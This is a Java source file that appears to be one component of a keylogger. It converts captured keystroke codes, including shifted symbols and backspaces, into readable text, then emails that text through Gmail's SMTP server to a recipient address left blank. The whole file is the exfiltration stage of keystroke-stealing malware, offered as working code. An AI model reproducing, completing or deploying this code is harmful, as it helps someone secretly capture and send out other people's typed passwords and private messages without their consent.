import java.util.Properties;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;




/**
 * Created by Anirudh on 28-01-2017.
 */
public class closer {
    // Helps in convertin special characters and capital letters
    public static void convert(Keystore[] store) {
        String s = "";
        for (int i =  0 ; i < store.length ; i++) {
            int temp = store[i].getAscii() ;
            switch (temp) {
                case 8 :
                    s = s.substring(0,s.length()-1) ;
                    break;
                case 13 :
                    s+="\n" ;
                    break;
                case 38 :
                    s+="~38~" ;
                    break;
                case 40 :
                    s+="~40~" ;
                    break;
                case 37 :
                    s+="~37~" ;
                    break;
                case 39:
                    s+="~39~" ;
                    break;
                case 32:
                    s+=" " ;
                    break;
                default:
                if (!store[i].getShift()) {
                    s +=String.valueOf((char) (int) temp).toLowerCase();

                } else if (store[i].getShift()) {
                    switch (temp) {
                        case 48:
                            s += ")";
                            break;
                        case 49:
                            s += "!";
                            break;
                        case 50:
                            s += "@";
                            break;
                        case 51:
                            s += "#";
                            break;
                        case 52:
                            s += "$";
                            break;
                        case 53:
                            s += "%";
                            break;
                        case 54:
                            s += "^";
                            break;
                        case 55:
                            s += "&";
                            break;
                        case 56:
                            s += "*";
                            break;
                        case 57:
                            s += "(";
                            break;
                        case 191:
                            s+="?" ;
                            break;
                        default:
                            s+=String.valueOf((char)(int) temp) ;
                            break;


                    }
                }
            }
        }

        closer.send(s) ;
    }
    //sends the mail
    public static void send(String y) {
        final String username = "";
        final String password = "";

        Properties props = new Properties();
        props.put("mail.smtp.auth", "true");
        props.put("mail.smtp.starttls.enable", "true");
        props.put("mail.smtp.host", "smtp.gmail.com");
        props.put("mail.smtp.port", "587");

        Session session = Session.getInstance(props,
                new javax.mail.Authenticator() {
                    protected PasswordAuthentication getPasswordAuthentication() {
                        return new PasswordAuthentication(username, password);
                    }
                });

        try {

            Message message = new MimeMessage(session);
            // put in your email address
            message.setFrom(new InternetAddress(""));
            //reciever's email address
            message.setRecipients(Message.RecipientType.TO,
                    InternetAddress.parse(""));
            message.setSubject("");
            message.setText(y);

            Transport.send(message);

            System.out.println("Done");

        } catch (MessagingException e) {
            throw new RuntimeException(e);
        }

    }
    public static void main(String[] args) {
        closer.send("Ytt");

    }
}
